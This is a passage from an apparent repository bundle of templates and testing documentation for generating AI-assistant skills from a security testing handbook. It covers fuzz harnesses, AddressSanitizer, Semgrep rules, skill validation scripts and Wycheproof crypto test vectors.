harnesses. Use when creating\n  new fuzz targets or improving existing harness code.\n---\n\n# Writing Fuzzing Harnesses\n\nA harness is the entrypoint for your fuzz test. The fuzzer calls this function\nwith random data, and the harness routes that data to your code under test.\n\n## Overview\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| Harness | Function that receives fuzzer input and calls target code |\n| SUT | System Under Test - the code being fuzzed |\n| Entry point | Function signature required by the fuzzer |\n\n## When to Apply\n\n**Apply this technique when:**\n- Creating a new fuzz target\n- Fuzz campaign has low coverage\n- Crashes are not reproducible\n\n**Skip this technique when:**\n- Using existing well-tested harnesses\n- Tool provides automatic harness generation\n\n## Quick Reference\n\n| Task | Pattern |\n|------|---------|\n| Minimal C++ harness | `extern \"C\" int LLVMFuzzerTestOneInput(const uint8_t*, size_t)` |\n| Minimal Rust harness | `fuzz_target!(|data: &[u8]| { ... })` |\n| Minimal Go harness | `func Fuzz(data []byte) int { ... }` |\n| Size validation | `if (size < MIN) return 0;` |\n\n## Step-by-Step\n\n### Step 1: Identify Entry Points\n\nFind functions that:\n- Accept external input\n- Parse data formats\n- Perform validation\n\n### Step 2: Write Minimal Harness\n\n\\```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    target_function(data, size);\n    return 0;\n}\n\\```\n\n### Step 3: Add Input Validation\n\n\\```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    if (size < MIN_SIZE || size > MAX_SIZE) return 0;\n    target_function(data, size);\n    return 0;\n}\n\\```\n\n## Common Patterns\n\n### Pattern: Size-Bounded Input\n\n**Use Case:** When target expects minimum input size\n\n**Before:**\n\\```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    parse_message(data, size);  // May crash on tiny inputs\n    return 0;\n}\n\\```\n\n**After:**\n\\```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    if (size < sizeof(header_t)) return 0;  // Skip invalid sizes\n    parse_message(data, size);\n    return 0;\n}\n\\```\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Start with parsers | High bug density, clear entry points |\n| Use FuzzedDataProvider | Structured data extraction from fuzz input |\n| Mock I/O operations | Prevents hangs, enables determinism |\n\n### Structure-Aware Fuzzing\n\n{How to use proto definitions, grammars, etc.}\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| Global state | Non-deterministic | Reset state in harness |\n| Blocking I/O | Hangs fuzzer | Mock or skip I/O |\n| Memory leaks | Resource exhaustion | Free in harness |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\n\\```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Your code here\n    return 0;\n}\n\\```\n\n**Integration tips:**\n- Use `FuzzedDataProvider` for structured extraction\n- Compile with `-fsanitize=fuzzer`\n\n### AFL++\n\n\\```c++\nint main(int argc, char **argv) {\n    #ifdef __AFL_HAVE_MANUAL_CONTROL\n        __AFL_INIT();\n    #endif\n\n    unsigned char *buf = NULL;\n    size_t len = 0;\n    while (__AFL_LOOP(10000)) {\n        // Read from stdin, call target\n    }\n    return 0;\n}\n\\```\n\n**Integration tips:**\n- Use persistent mode for performance\n- Consider deferred initialization\n\n### cargo-fuzz (Rust)\n\n\\```rust\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\n\nfuzz_target!(|data: &[u8]| {\n    // Your code here\n});\n\\```\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **libfuzzer** | Uses LLVMFuzzerTestOneInput harness signature |\n| **aflpp** | Supports persistent mode harnesses |\n| **cargo-fuzz** | Uses Rust-specific harness macros |\n| **go-fuzz** | Uses Go-specific harness signature |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **coverage-analysis** | Measure harness effectiveness |\n| **address-sanitizer** | Detect bugs found by harness |\n| **fuzzing-corpus** | Provide seed inputs to harness |\n\n...\n```\n\n## Example: AddressSanitizer\n\n```markdown\n---\nname: address-sanitizer\ntype: technique\ndescription: >\n  Memory error detection for C/C++ fuzzing. Use when fuzzing C/C++ code\n  to detect memory corruption bugs like buffer overflows and use-after-free.\n---\n\n# AddressSanitizer (ASan)\n\nAddressSanitizer is a fast memory error detector for C/C++. It finds buffer\noverflows, use-after-free, and other memory bugs with ~2x slowdown.\n\n## Quick Reference\n\n| Task | Command |\n|------|---------|\n| Enable ASan (Clang) | `-fsanitize=address` |\n| Enable ASan (GCC) | `-fsanitize=address` |\n| Disable leak detection | `ASAN_OPTIONS=detect_leaks=0` |\n| Increase stack size | `ASAN_OPTIONS=stack_size=...` |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\n\\```bash\nclang++ -fsanitize=fuzzer,address -g harness.cc -o fuzz\n\\```\n\n**Integration tips:**\n- Always combine with fuzzer sanitizer\n- Use `-g` for better stack traces\n\n### AFL++\n\n\\```bash\nAFL_USE_ASAN=1 afl-clang-fast++ -g harness.cc -o fuzz\n\\```\n\n**Integration tips:**\n- Use `AFL_USE_ASAN` environment variable\n- Consider memory limits with `AFL_MAP_SIZE`\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **libfuzzer** | Compile with `-fsanitize=fuzzer,address` |\n| **aflpp** | Use `AFL_USE_ASAN=1` |\n| **honggfuzz** | Compile with `-fsanitize=address` |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **undefined-behavior-sanitizer** | Often used together for comprehensive detection |\n| **fuzz-harness-writing** | Harness must handle ASan-detected crashes |\n| **coverage-analysis** | Coverage guides fuzzer to trigger ASan errors |\n\n...\n```\n\n## Notes\n\n- Technique skills should be tool-agnostic in overview, tool-specific in guidance\n- ALWAYS include Tool-Specific Guidance section for major tools\n- ALWAYS include Related Skills with bidirectional links\n- Include Tips and Tricks in Advanced Usage section\n- Link to related technique skills\n- Keep under 500 lines\n- Fetch non-video external resources with WebFetch, extract key insights\n- For videos (YouTube, Vimeo): include title/URL only, do not fetch\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/tool-skill.md": "# Tool Skill Template\n\nUse this template for static analysis tools (Semgrep, CodeQL) and similar standalone CLI tools.\n\n## Template Structure\n\n```markdown\n---\nname: {tool-name-lowercase}\ntype: tool\ndescription: >\n  {Summary from handbook}. Use when {trigger conditions based on tool purpose}.\n---\n\n# {Tool Name}\n\n{Brief introduction from handbook _index.md - 1-2 paragraphs max}\n\n## When to Use\n\n{Decision criteria from handbook \"Ideal use case\" or similar section}\n\n**Use {Tool Name} when:**\n- {Criterion 1}\n- {Criterion 2}\n- {Criterion 3}\n\n**Consider alternatives when:**\n- {Limitation 1}  Consider {Alternative Tool}\n- {Limitation 2}  Consider {Alternative Tool}\n\n## Quick Reference\n\n| Task | Command |\n|------|---------|\n| {Task 1} | `{command 1}` |\n| {Task 2} | `{command 2}` |\n| {Task 3} | `{command 3}` |\n\n## Installation\n\n{Content from 00-installation.md or installation section}\n\n### Prerequisites\n\n{System requirements}\n\n### Install Steps\n\n{Step-by-step installation - preserve code blocks exactly}\n\n### Verification\n\n\\```bash\n{Command to verify installation}\n\\```\n\n## Core Workflow\n\n{Main usage patterns from handbook - the typical workflow}\n\n### Step 1: {First Step}\n\n{Instructions}\n\n### Step 2: {Second Step}\n\n{Instructions}\n\n### Step 3: {Third Step}\n\n{Instructions}\n\n## How to Customize\n\n{Include this section for tools that support custom rules/queries like Semgrep, CodeQL, etc.\nSkip this section for simple CLI tools like golint that don't support user-defined rules.}\n\n### Writing Custom {Rules/Queries}\n\n{Basic structure and syntax}\n\n\\```{language}\n{Template for custom rule/query with comments}\n\\```\n\n### Key Syntax Reference\n\n| Syntax/Operator | Description | Example |\n|-----------------|-------------|---------|\n| {Syntax 1} | {What it does} | `{example}` |\n| {Syntax 2} | {What it does} | `{example}` |\n\n### Example: {Common Use Case}\n\n{Complete example of a custom rule/query for a realistic use case}\n\n\\```{language}\n{Full working custom rule/query}\n\\```\n\n### Testing Custom {Rules/Queries}\n\n{How to validate that custom rules/queries work correctly}\n\n\\```bash\n{Test command}\n\\```\n\n## Configuration\n\n{Settings, config files, ignore files}\n\n### Configuration File\n\n{Location and format of main config file}\n\n\\```{format}\n{Example config file content}\n\\```\n\n### Ignore Patterns\n\n{How to exclude files/paths - .semgrepignore, .codeqlignore, etc.}\n\n\\```\n{Example ignore patterns}\n\\```\n\n### Suppressing False Positives\n\n{How to suppress specific findings inline}\n\n\\```{language}\n{Example suppression comment}\n\\```\n\n## Advanced Usage\n\n{Content from 10-advanced.md or advanced section}\n\n### Tips and Tricks\n\n{Practical tips from experienced users - extract from handbook hints/warnings}\n\n| Tip | Why It Helps |\n|-----|--------------|\n| {Tip 1} | {Explanation} |\n| {Tip 2} | {Explanation} |\n\n### {Advanced Topic 1}\n\n{Details}\n\n### {Advanced Topic 2}\n\n{Details}\n\n### Performance Optimization\n\n{How to speed up analysis for large codebases}\n\n\\```bash\n{Performance-related flags or commands}\n\\```\n\n## CI/CD Integration\n\n{Content from 20-ci.md if available}\n\n### GitHub Actions\n\n\\```yaml\n{Example workflow - preserve exactly from handbook}\n\\```\n\n### Other CI Systems\n\n{General guidance for Jenkins, GitLab CI, etc.}\n\n## Common Mistakes\n\n{Extracted from handbook tips, hints, and warnings}\n\n| Mistake | Why It's Wrong | Correct Approach |\n|---------|----------------|------------------|\n| {Mistake 1} | {Reason} | {Fix} |\n| {Mistake 2} | {Reason} | {Fix} |\n\n## Limitations\n\n{What the tool cannot do - important for setting expectations}\n\n- **{Limitation 1}:** {Explanation and when this matters}\n- **{Limitation 2}:** {Explanation and when this matters}\n- **{Limitation 3}:** {Explanation and when this matters}\n\n## Related Skills\n\n{Link to complementary skills - helps discoverability}\n\n| Skill | When to Use Together |\n|-------|---------------------|\n| **{skill-name-1}** | {Integration scenario - e.g., \"For advanced taint tracking beyond intraprocedural\"} |\n| **{skill-name-2}** | {Integration scenario} |\n\n## Resources\n\n{From 99-resources.md - fetch non-video URLs with WebFetch, extract insights}\n\n### Key External Resources\n\n{For each non-video URL: fetch with WebFetch, summarize key techniques/insights}\n\n**[{Title 1}]({URL})**\n{Summarized insights: key techniques, patterns, examples extracted from the page}\n\n**[{Title 2}]({URL})**\n{Summarized insights from fetched content}\n\n### Video Resources\n\n{Videos - title and URL only, no fetching}\n\n- [{Video Title}]({YouTube/Vimeo URL}) - {Brief description from handbook}\n```\n\n## Field Extraction Guide\n\n| Template Field | Handbook Source |\n|----------------|-----------------|\n| `{tool-name-lowercase}` | Slugified title from `_index.md` |\n| `{Summary from handbook}` | `summary` field from frontmatter |\n| `{Tool Name}` | `title` field from frontmatter |\n| `{trigger conditions}` | Derive from \"Ideal use case\" or benefits |\n| Quick Reference commands | Extract from code blocks in main content |\n| Installation | `00-installation.md` or installation section |\n| How to Customize | From custom rules/queries section (if tool supports it) |\n| Configuration | From config file documentation |\n| Advanced Usage | `10-advanced.md` or advanced section |\n| CI/CD Integration | `20-ci.md` if exists |\n| Limitations | Extract from \"when not to use\" or caveats |\n| Resources | `99-resources.md` or `91-resources.md` |\n\n## Section Applicability Guide\n\nNot all sections apply to every tool. Use this guide:\n\n| Section | When to Include |\n|---------|-----------------|\n| How to Customize | Tool supports custom rules/queries (Semgrep, CodeQL, Bandit) |\n| Configuration | Tool has config files or significant options |\n| CI/CD Integration | Tool is commonly used in CI pipelines |\n| Related Skills | Complementary skills exist in the handbook |\n\n## Example: Semgrep\n\n```markdown\n---\nname: semgrep\ntype: tool\ndescription: >\n  Fast static analysis for finding bugs, detecting vulnerabilities, and enforcing code standards.\n  Use when scanning code for security issues, enforcing patterns, or integrating into CI/CD pipelines.\n---\n\n# Semgrep\n\nSemgrep is a highly efficient static analysis tool for finding low-complexity bugs and locating\nspecific code patterns. Because of its ease of use, no need to build the code, and convenient\ncreation of custom rules, it is usually the first tool to run on an audited codebase.\n\n## When to Use\n\n**Use Semgrep when:**\n- Looking for low-complexity bugs with identifiable patterns\n- Scanning single files (intraprocedural analysis)\n- Detecting systemic bugs across codebase\n- Enforcing secure defaults and code standards\n\n**Consider alternatives when:**\n- Analysis requires multiple files (cross-file)  Consider CodeQL\n- Complex taint tracking is needed  Consider CodeQL\n- Need to analyze build artifacts  Consider binary analysis tools\n\n## Quick Reference\n\n| Task | Command |\n|------|---------|\n| Scan with default rules | `semgrep --config=auto .` |\n| Scan with specific rule | `semgrep --config=path/to/rule.yaml .` |\n| Output JSON | `semgrep --json --config=auto .` |\n\n## How to Customize\n\n### Writing Custom Rules\n\nSemgrep rules are YAML files with pattern matching. Basic structure:\n\n\\```yaml\nrules:\n  - id: rule-id\n    languages: [python]\n    message: \"Description of the issue: $VAR\"\n    severity: ERROR\n    pattern: dangerous_function($VAR)\n\\```\n\n### Key Syntax Reference\n\n| Syntax | Description | Example |\n|--------|-------------|---------|\n| `...` | Match anything | `func(...)` |\n| `$VAR` | Capture metavariable | `$FUNC($INPUT)` |\n| `<... ...>` | Deep expression match | `<... user_input ...>` |\n\n### Example: SQL Injection Detection\n\n\\```yaml\nrules:\n  - id: sql-injection\n    languages: [python]\n    message: \"Potential SQL injection with user input\"\n    severity: ERROR\n    mode: taint\n    pattern-sources:\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: cursor.execute($QUERY)\n    pattern-sanitizers:\n      - pattern: int(...)\n\\```\n\n### Testing Custom Rules\n\n\\```bash\n# Create test file with # ruleid: and # ok: annotations\nsemgrep --test rules/\n\\```\n\n## Limitations\n\n- **Single-file analysis:** Cannot track data flow across files without Pro\n- **No build required:** Cannot analyze compiled code or resolve dynamic dependencies\n- **Pattern-based:** May miss vulnerabilities requiring semantic understanding\n\n## Related Skills\n\n| Skill | When to Use Together |\n|-------|---------------------|\n| **codeql** | For cross-file taint tracking and complex data flow |\n| **sarif-parsing** | For processing Semgrep SARIF output in pipelines |\n\n...\n```\n\n## Notes\n\n- Keep total lines under 500\n- Preserve code blocks exactly from handbook\n- Strip Hugo shortcodes (hints, tabs, etc.)\n- Fetch non-video external resources with WebFetch, extract key insights\n- For videos (YouTube, Vimeo): include title/URL only, do not fetch\n- Include \"How to Customize\" ONLY for tools with extensibility (not simple linters)\n- Include \"Related Skills\" to help users discover complementary tools\n- If section doesn't exist in handbook, omit from skill\n",
        "plugins/testing-handbook-skills/skills/testing-handbook-generator/testing.md": "# Testing Strategy\n\nMethodology for validating generated skills.\n\n## Prerequisites\n\nRequired tools for validation:\n\n### Python Dependencies\n\nInstall from the scripts directory:\n\n```bash\ncd plugins/testing-handbook-skills/scripts\nuv pip install .\n```\n\n### Optional Tools\n\n- `yq` - YAML processor for manual checks: `brew install yq` (macOS)\n\n## Automated Validation\n\nUse the validator script for comprehensive validation:\n\n```bash\n# Validate all generated skills\nuv run scripts/validate-skills.py\n\n# Validate specific skill\nuv run scripts/validate-skills.py --skill libfuzzer\n\n# Output JSON for CI integration\nuv run scripts/validate-skills.py --json\n\n# Verbose output with details\nuv run scripts/validate-skills.py -v\n```\n\nThe validator checks:\n- YAML frontmatter parsing and field validation (name, description)\n- Required sections presence by skill type\n- Line count limits (<500)\n- Hugo shortcode detection\n- Cross-reference validation (related skills exist)\n- Internal link resolution\n\n## Path Convention\n\nAll paths in this document are relative to `testing-handbook-generator/`:\n- Generated skills: `../[skill-name]/SKILL.md`\n- Templates: `./templates/[type]-skill.md`\n\n## Quick Validation Reference\n\n**Recommended:** Use the automated validator:\n\n```bash\nuv run scripts/validate-skills.py --skill [skill-name]\n```\n\n**Manual checks** (for debugging or when validator is unavailable):\n\n| Check | Command | Pass | Fail |\n|-------|---------|------|------|\n| Line count | `wc -l SKILL.md` | < 500 |  500 |\n| Hugo shortcodes | `grep -cE '\\{\\{[<%]' SKILL.md` | 0 | > 0 |\n| Escaped backticks | `grep -cE '\\\\`{3}' SKILL.md` | 0 | > 0 |\n| YAML valid | `head -50 SKILL.md \\| yq -e '.' 2>&1` | No output | Error message |\n| Name format | `yq '.name' SKILL.md` | `lowercase-name` | Mixed case, spaces, or special chars |\n| Description exists | `yq '.description' SKILL.md` | Non-empty string | `null` or empty |\n| Required sections | `grep -c '^## ' SKILL.md` |  3 | < 3 |\n\n## One-Liner Validation\n\n**Recommended:** Use the automated validator for all checks:\n\n```bash\n# Validate all skills at once\nuv run scripts/validate-skills.py\n\n# JSON output for CI pipelines\nuv run scripts/validate-skills.py --json\n```\n\n**Legacy shell commands** (for environments without Python):\n\n```bash\nSKILL=\"../libfuzzer/SKILL.md\" && \\\n  [ $(wc -l < \"$SKILL\") -lt 500 ] && \\\n  [ $(grep -cE '\\{\\{[<%]' \"$SKILL\") -eq 0 ] && \\\n  awk '/^---$/{if(++n==2)exit}n==1' \"$SKILL\" | yq -e '.' >/dev/null 2>&1 && \\\n  echo \" Valid: $SKILL\" || echo \" Invalid: $SKILL\"\n```\n\n## Validity Checks\n\nRun these checks on every generated skill before delivery.\n\n### 1. YAML Frontmatter Validation\n\n**Check:** Frontmatter parses without errors\n\n```bash\n# Set skill path (replace 'libfuzzer' with target skill name)\nSKILL=\"../libfuzzer/SKILL.md\"\n\n# Extract and validate frontmatter (awk extracts content between first two ---)\nawk '/^---$/{if(++n==2)exit}n==1' \"$SKILL\" | yq -e '.'\n\n# Validate name field\nNAME=$(yq '.name' \"$SKILL\")\necho \"$NAME\" | grep -qE '^[a-z0-9-]{1,64}$' && echo \"Name: OK\" || echo \"Name: INVALID\"\n\n# Validate description length\nDESC=$(yq '.description' \"$SKILL\")\n[ ${#DESC} -le 1024 ] && [ ${#DESC} -gt 0 ] && echo \"Description: OK\" || echo \"Description: INVALID\"\n```\n\n**Required fields:**\n| Field | Requirement | Validation |\n|-------|-------------|------------|\n| `name` | Present, lowercase, max 64 chars | Pattern: `^[a-z0-9-]{1,64}$` |\n| `type` | Recommended, one of: tool, fuzzer, technique, domain | Determines required sections |\n| `description` | Present, non-empty, max 1024 chars | Length: 1-1024 chars |\n\n**Validation rules:**\n- No XML/HTML tags in name or description (pattern: `<[^>]+>`)\n- No reserved words (\"anthropic\", \"claude\") in name\n- `type` field ensures correct section validation (if missing, type is inferred from content)\n- Description should include both \"what\" (tool purpose) and \"when\" (trigger conditions)\n- No Hugo shortcodes in frontmatter (pattern: `\\{\\{[<%]`)\n\n**Trigger phrase validation:**\n\nThe description MUST include a trigger phrase (\"Use when\" or \"Use for\"):\n\n```bash\n# Check for trigger phrase in description\nDESC=$(yq '.description' \"$SKILL\")\necho \"$DESC\" | grep -qE 'Use when|Use for' && echo \"Trigger: OK\" || echo \"Trigger: MISSING\"\n```\n\n### 2. Required Sections\n\n**Check:** Skill contains essential sections\n\n| Section | Required | Purpose |\n|---------|----------|---------|\n| `# Title` | Yes | Main heading |\n| `## When to Use` | Yes | Trigger conditions |\n| `## Quick Reference` or `## Quick Start` | Yes | Fast access to key info |\n| Core workflow/content sections | Yes | Main skill content |\n| `## Resources` | If handbook has resources | External links |\n\n**Template-specific required sections:**\n\n| Skill Type | Required Sections |\n|------------|-------------------|\n| Tool | When to Use, Quick Reference, Installation, Core Workflow |\n| Fuzzer | When to Use, Quick Start, Writing a Harness, Related Skills |\n| Technique | When to Apply, Quick Reference, Tool-Specific Guidance, Related Skills |\n| Domain | Background, Quick Reference, Testing Workflow, Related Skills |\n\n**Section validation command:**\n\n```bash\n# Validate required sections for a tool skill\nSKILL=\"../semgrep/SKILL.md\"\nREQUIRED=(\"When to Use\" \"Quick Reference\" \"Installation\" \"Core Workflow\")\n\nfor section in \"${REQUIRED[@]}\"; do\n  grep -q \"^## $section\" \"$SKILL\" && echo \" $section\" || echo \" Missing: $section\"\ndone\n```\n\n**Related Skills validation:**\n\nFor Fuzzer, Technique, and Domain skills, verify that the Related Skills section exists and references valid skills:\n\n```bash\n# Check Related Skills section exists\ngrep -q \"^## Related Skills\" \"$SKILL\" || echo \" Missing: Related Skills section\"\n\n# Extract skill references and check they exist\ngrep -oE '\\*\\*[a-z0-9-]+\\*\\*' \"$SKILL\" | tr -d '*' | sort -u | while read ref; do\n  [ -d \"../$ref\" ] && echo \" $ref exists\" || echo \" $ref not found (may be planned)\"\ndone\n```\n\n### 3. Line Count\n\n**Check:** SKILL.md under 500 lines\n\n```bash\nwc -l ../libfuzzer/SKILL.md  # Replace 'libfuzzer' with target skill\n# Should be < 500\n```\n\n**If over 500 lines:**\n- Split into supporting files\n- Keep SKILL.md as overview with decision tree\n- Reference supporting files with relative links\n\n### 4. Internal Reference Resolution\n\n**Check:** All internal links resolve\n\n```bash\nSKILL=\"../libfuzzer/SKILL.md\"  # Replace 'libfuzzer' with target skill\nSKILL_DIR=$(dirname \"$SKILL\")\n\n# Find markdown links and verify they exist\ngrep -oE '\\[.+\\]\\(([^)]+)\\)' \"$SKILL\" | grep -oE '\\([^)]+\\)' | tr -d '()' | while read link; do\n  # Skip external URLs\n  [[ \"$link\" =~ ^https?:// ]] && continue\n  # Check if file exists\n  [ -f \"$SKILL_DIR/$link\" ] && echo \" $link\" || echo \" $link (not found)\"\ndone\n```\n\n**Common issues:**\n| Issue | Fix |\n|-------|-----|\n| Link to non-existent file | Create file or remove link |\n| Broken anchor | Update anchor or content |\n| Absolute path used | Convert to relative path |\n\n### 5. Code Block Preservation\n\n**Check:** Code blocks preserved from handbook\n\nCompare code blocks in generated skill vs source handbook section:\n- Indentation preserved\n- Language specifier present\n- No truncation\n\n### 6. Hugo Shortcode Removal\n\n**Check:** No Hugo shortcodes remain\n\n```bash\n# Should return nothing (exit code 1 = pass, exit code 0 = shortcodes found)\ngrep -E '\\{\\{[<%]' ../libfuzzer/SKILL.md  # Replace 'libfuzzer' with target skill\n```\n\n**Shortcodes to remove:**\n- `{{< hint >}}...{{< /hint >}}`\n- `{{< tabs >}}...{{< /tabs >}}`\n- `{{< customFigure >}}`\n- `{{% relref \"...\" %}}`\n\n## Activation Testing\n\nVerify Claude activates the skill correctly.\n\n### Test 1: Direct Invocation\n\n**Prompt:** \"Use the [skill-name] skill\"\n\n**Expected:**\n- Claude loads SKILL.md\n- Claude references skill content\n- Claude follows skill workflow\n\n### Test 2: Implicit Trigger\n\n**Sample prompts by skill type:**\n\n| Skill Type | Test Prompt |\n|------------|-------------|\n| Tool (semgrep) | \"Scan this Python code for security issues\" |\n| Tool (codeql) | \"Set up CodeQL for my Java project\" |\n| Fuzzer (libfuzzer) | \"Help me fuzz this C function\" |\n| Fuzzer (aflpp) | \"Set up AFL++ for multi-core fuzzing\" |\n| Technique (harness) | \"Write a fuzzing harness for this parser\" |\n| Technique (coverage) | \"Analyze coverage of my fuzzing campaign\" |\n| Domain (wycheproof) | \"Test my ECDSA implementation\" |\n| Domain (constant-time) | \"Check if this crypto code has timing leaks\" |\n\n**Expected:**\n- Skill description matches prompt intent\n- Claude selects this skill over alternatives\n- Claude uses skill content appropriately\n\n### Test 3: Decision Tree Navigation\n\n**Test:** Claude navigates to supporting files correctly\n\n**Prompts:**\n1. General query  Should use SKILL.md overview\n2. Specific topic  Should read appropriate supporting file\n3. Advanced topic  Should follow decision tree to detailed doc\n\n## Iteration Loop\n\n```\n\n                    Generate Skill                    \n\n                         \n                         \n\n         Run Validator Script                         \n  uv run scripts/validate-skills.py --skill [name]   \n                                                     \n  Checks: YAML, sections, line count, shortcodes,   \n          cross-refs, internal links                 \n\n                         \n              \n                                   \n         All Pass              Failed\n                                   \n                                   \n   \n  Activation Test          Fix Issues        \n  - Direct invoke          - Edit skill      \n  - Implicit trigger       - Re-run validator\n  - Decision tree       \n            \n                                  \n                                  \n            \n     Pass?                       \n            \n                                  \n                        \n   Yes        No                   \n                                 \n             \n    \n\n                  Mark Complete                       \n  - Report success to user                           \n  - List any warnings from validator                 \n\n```\n\n## Quality Checklist\n\nBefore delivering each generated skill:\n\n```markdown\n## Skill: [name]\n\n### Automated Validation\n- [ ] Validator passes: `uv run scripts/validate-skills.py --skill [name]`\n- [ ] No errors in output\n- [ ] Warnings reviewed and addressed (or documented as acceptable)\n\n### Content Quality (manual review)\n- [ ] Description includes what AND when\n- [ ] When to Use section has clear triggers\n- [ ] Quick Reference is actionable\n- [ ] Code examples are complete and runnable\n- [ ] Resources section has titles and URLs\n\n### Activation Testing\n- [ ] Direct invocation works\n- [ ] Implicit trigger matches expected prompts\n- [ ] Decision tree navigation correct\n```\n\n## Bulk Generation Report\n\nWhen generating multiple skills, use the validator JSON output:\n\n```bash\n# Generate JSON report\nuv run scripts/validate-skills.py --json > validation-report.json\n\n# Or view in terminal\nuv run scripts/validate-skills.py\n```\n\nExample validator output:\n```\n==================================================\nVALIDATION REPORT\n==================================================\n libfuzzer\n semgrep \n  WARNING: Line count 480 approaching limit of 500\n wycheproof\n  ERROR: Missing required sections for domain skill: ['Background']\n\n--------------------------------------------------\nTotal:    3\nPassed:   2\nFailed:   1\nWarnings: 1\n--------------------------------------------------\n 1 skill(s) failed validation\n```\n\nAfter validation, document results:\n\n```markdown\n# Skill Generation Report\n\n## Validator Results\n- Total: X\n- Passed: Y\n- Failed: Z\n- With warnings: W\n\n## Actions Needed\n\n### Failed Skills\n1. **wycheproof**: Add Background section\n\n### Warnings\n1. **semgrep**: Line count 480 - consider splitting\n\n## Next Steps\n- [ ] Fix failed skills\n- [ ] Address warnings\n- [ ] Run activation tests\n```\n\n## Common Issues and Fixes\n\n| Issue | Cause | Fix |\n|-------|-------|-----|\n| YAML parse error | Bad indentation in description | Use `>` for multi-line |\n| Missing section | Template not fully populated | Fill from handbook |\n| Over 500 lines | Too much detail in main file | Split to supporting files |\n| Broken reference | Supporting file not created | Create file or remove link |\n| Shortcode remains | Incomplete conversion | Apply shortcode stripping |\n| Activation fails | Poor description | Improve trigger keywords |\n\n## Post-Generation Checklist\n\nAfter all skills pass validation, complete the tasks in [SKILL.md Post-Generation Tasks](SKILL.md#post-generation-tasks).\n\n**Summary of required actions:**\n1. Update main `README.md` with generated skills table\n2. Capture self-improvement notes\n\n## Self-Improvement Framework\n\nAfter each generation run, systematically review and improve the generator.\n\n### Review Questions\n\n| Category | Question | If Yes, Update |\n|----------|----------|----------------|\n| Content extraction | Did any handbook content not extract cleanly? | `discovery.md` (section 3.2) |\n| Shortcodes | Were there shortcodes or formats not handled? | `discovery.md` (section 3.2) |\n| Manual fixes | Did any skills require manual fixes after generation? | Templates or agent prompt |\n| Detection | Are there patterns in the handbook not detected? | `discovery.md` (section 1.3) |\n| Activation | Did activation testing reveal description issues? | Templates (description guidance) |\n| Validation | Did a bug slip through validation? | `testing.md` (add new check) |\n\n### Improvement Log Format\n\nWhen making improvements, document them:\n\n```markdown\n## Self-Improvement Log\n\n### YYYY-MM-DD: {Brief title}\n\n**Issue:** {What went wrong during generation}\n**Example:** {Specific skill/section affected}\n**Root cause:** {Why the current logic failed}\n**Fix:** {What was changed}\n**Files modified:**\n- `{file1}`: {what changed}\n- `{file2}`: {what changed}\n**Verification:** {How to confirm the fix works}\n```\n\n### Improvement Priority\n\n| Priority | Criteria | Action |\n|----------|----------|--------|\n| P0 - Critical | Generated skill is broken/unusable | Fix immediately, re-generate affected skills |\n| P1 - High | Content missing or incorrect | Fix before next generation run |\n| P2 - Medium | Suboptimal but functional | Add to backlog, fix when convenient |\n| P3 - Low | Minor formatting/style issues | Optional improvement |\n",
        "plugins/testing-handbook-skills/skills/wycheproof/SKILL.md": "---\nname: wycheproof\ntype: domain\ndescription: >\n  Wycheproof provides test vectors for validating cryptographic implementations.\n  Use when testing crypto code for known attacks and edge cases.\n---\n\n# Wycheproof\n\nWycheproof is an extensive collection of test vectors designed to verify the correctness of cryptographic implementations and test against known attacks. Originally developed by Google, it is now a community-managed project where contributors can add test vectors for specific cryptographic constructions.\n\n## Background\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| Test vector | Input/output pair for validating crypto implementation correctness |\n| Test group | Collection of test vectors sharing attributes (key size, IV size, curve) |\n| Result flag | Indicates if test should pass (valid), fail (invalid), or is acceptable |\n| Edge case testing | Testing for known vulnerabilities and attack patterns |\n\n### Why This Matters\n\nCryptographic implementations are notoriously difficult to get right. Even small bugs can:\n- Expose private keys\n- Allow signature forgery\n- Enable message decryption\n- Create consensus problems when different implementations accept/reject the same inputs\n\nWycheproof has found vulnerabilities in major libraries including OpenJDK's SHA1withDSA, Bouncy Castle's ECDHC, and the elliptic npm package.\n\n## When to Use\n\n**Apply Wycheproof when:**\n- Testing cryptographic implementations (AES-GCM, ECDSA, ECDH, RSA, etc.)\n- Validating that crypto code handles edge cases correctly\n- Verifying implementations against known attack vectors\n- Setting up CI/CD for cryptographic libraries\n- Auditing third-party crypto code for correctness\n\n**Consider alternatives when:**\n- Testing for timing side-channels (use constant-time testing tools instead)\n- Finding new unknown bugs (use fuzzing instead)\n- Testing custom/experimental cryptographic algorithms (Wycheproof only covers established algorithms)\n\n## Quick Reference\n\n| Scenario | Recommended Approach | Notes |\n|----------|---------------------|-------|\n| AES-GCM implementation | Use `aes_gcm_test.json` | 316 test vectors across 44 test groups |\n| ECDSA verification | Use `ecdsa_*_test.json` for specific curves | Tests signature malleability, DER encoding |\n| ECDH key exchange | Use `ecdh_*_test.json` | Tests invalid curve attacks |\n| RSA signatures | Use `rsa_*_test.json` | Tests padding oracle attacks |\n| ChaCha20-Poly1305 | Use `chacha20_poly1305_test.json` | Tests AEAD implementation |\n\n## Testing Workflow\n\n```\nPhase 1: Setup                 Phase 2: Parse Test Vectors\n          \n Add Wycheproof            Load JSON file  \n as submodule               Filter by params\n          \n                                     \nPhase 4: CI Integration        Phase 3: Write Harness\n          \n Auto-update               Test valid &    